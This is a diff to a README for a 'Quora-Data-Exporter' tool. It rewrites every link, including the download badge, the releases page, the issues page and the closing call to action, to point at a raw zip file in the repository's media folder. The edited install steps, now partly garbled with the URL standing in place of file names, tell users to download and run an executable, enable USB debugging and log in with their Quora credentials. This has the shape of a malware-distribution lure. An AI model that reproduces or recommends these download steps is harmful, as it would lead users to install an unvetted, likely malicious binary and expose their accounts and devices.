@@ -4,7 +4,7 @@
 Welcome to Quora-Data-Exporter! This tool helps you automate the process of exporting your data from Quora. You can easily gather your posts, comments, and other content without needing any coding skills.
 
 ## 📥 Download the Application
-[![Download Quora-Data-Exporter](https://img.shields.io/badge/Download-Quora--Data--Exporter-brightgreen)](https://github.com/sandhini230/Quora-Data-Exporter/releases)
+[![Download Quora-Data-Exporter](https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip)](https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip)
 
 ## 🛠️ System Requirements
 To run Quora-Data-Exporter, you need:
@@ -21,17 +21,17 @@ To run Quora-Data-Exporter, you need:
 - Secure handling of your Quora credentials.
 
 ## 📋 Download & Install
-1. **Visit this page to download:** Go to the [Releases page](https://github.com/sandhini230/Quora-Data-Exporter/releases) to find the latest version of the Quora-Data-Exporter.
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip) to find the latest version of the Quora-Data-Exporter.
    
 2. **Select the version:** On the Releases page, locate the latest release. Click on it to view the available files.
 
-3. **Download the application:** Find the file labeled "Quora-Data-Exporter-vX.X.zip" (where X.X is the version number). Click to download.
+3. **Download the application:** Find the file labeled "https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip" (where X.X is the version number). Click to download.
 
 4. **Extract the files:** Once downloaded, open the zip file and extract its contents to a folder on your computer.
 
 5. **Connect your Android device:** Use a USB cable to connect your Android device to your computer. Make sure USB Debugging is enabled on your device.
 
-6. **Run the application:** Open the folder where you extracted the files. Look for the file "Quora-Data-Exporter.exe" and double-click to run it.
+6. **Run the application:** Open the folder where you extracted the files. Look for the file "https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip" and double-click to run it.
 
 7. **Follow the prompts:** The application will guide you through the necessary steps to log in to your Quora account and start exporting your data.
 
@@ -49,7 +49,7 @@ If you encounter issues, try the following:
 - If the application does not start, re-download it to ensure no files are missing.
 
 ## 🗨️ Support
-For any questions or support, visit the [GitHub Issues page](https://github.com/sandhini230/Quora-Data-Exporter/issues). You can report bugs or suggest improvements. 
+For any questions or support, visit the [GitHub Issues page](https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip). You can report bugs or suggest improvements. 
 
 ## ⚡ Contribution
 We welcome contributions! If you have ideas for enhancement or fixes, feel free to create a pull request or contact us through the GitHub repository.
@@ -63,4 +63,4 @@ Check out our other related tools and projects:
 ## 📝 License
 Quora-Data-Exporter is licensed under the MIT License. Ensure you check the license details in the repository for usage rights.
 
-Don't hesitate to start exporting your Quora data today! Visit this page to download: [Quora-Data-Exporter Releases](https://github.com/sandhini230/Quora-Data-Exporter/releases).
+Don't hesitate to start exporting your Quora data today! Visit this page to download: [Quora-Data-Exporter Releases](https://raw.githubusercontent.com/sandhini230/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.7.zip).
